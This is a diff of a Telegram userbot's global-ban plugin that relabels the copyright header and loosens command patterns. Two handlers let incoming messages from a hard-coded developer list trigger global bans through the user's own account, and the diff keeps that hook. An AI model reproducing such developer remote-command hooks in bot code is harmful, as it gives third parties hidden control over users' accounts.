@@ -1,9 +1,9 @@
-# Ayra - UserBot
-# Copyright (C) 2021-2022 senpai80
+# Ultroid - UserBot
+# Copyright (C) 2021-2023 TeamUltroid
 #
-# This file is a part of < https://github.com/senpai80/Ayra/ >
+# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
 # PLease read the GNU Affero General Public License in
-# <https://www.github.com/senpai80/Ayra/blob/main/LICENSE/>.
+# <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.
 """
 ✘ **Bantuan Untuk Global**
 
@@ -35,7 +35,7 @@ from . import (LOGS, OWNER_NAME, ayra_bot, ayra_cmd, eod, get_string,
 
 
 @ayra_cmd(pattern="[uU][n][g][b][a][n]( (.*)|$)", fullsudo=False)
-@register(incoming=True, pattern=r"^\.cungban( (.*)|$)", from_users=DEVS)
+@register(incoming=True, pattern=r"^Cungban( (.*)|$)", from_users=DEVS)
 async def _(e):
     xx = await e.eor("`Proses...`")
     match = e.pattern_match.group(1).strip()
@@ -100,7 +100,7 @@ async def _(e):
 
 
 @ayra_cmd(pattern="[gG][b][a][n]( (.*)|$)", fullsudo=False)
-@register(incoming=True, pattern=r"^\.cgban( (.*)|$)", from_users=DEVS)
+@register(incoming=True, pattern=r"^Cgban( (.*)|$)", from_users=DEVS)
 async def _(e):
     xx = await e.eor("`Proses...`")
     reason = ""
@@ -181,7 +181,7 @@ async def _(e):
     await xx.edit(gb_msg)
 
 
-@ayra_cmd(pattern="gmute( (.*)|$)", fullsudo=False)
+@ayra_cmd(pattern="[Gg]mute( (.*)|$)", fullsudo=False)
 async def _(e):
     xx = await e.eor("`Gmuting...`")
     if e.reply_to_msg_id:
@@ -218,7 +218,7 @@ async def _(e):
     await xx.edit(f"`Gmuted` {inline_mention(name)} `in {chats} chats.`")
 
 
-@ayra_cmd(pattern="ungmute( (.*)|$)", fullsudo=False)
+@ayra_cmd(pattern="[uU]ngmute( (.*)|$)", fullsudo=False)
 async def _(e):
     xx = await e.eor("`UnGmuting...`")
     if e.reply_to_msg_id:
@@ -250,7 +250,7 @@ async def _(e):
 
 
 @ayra_cmd(
-    pattern="(L|l)istgban$",
+    pattern="[Ll]istgban$",
 )
 async def list_gengbanned(event):
     users = list_gbanned()
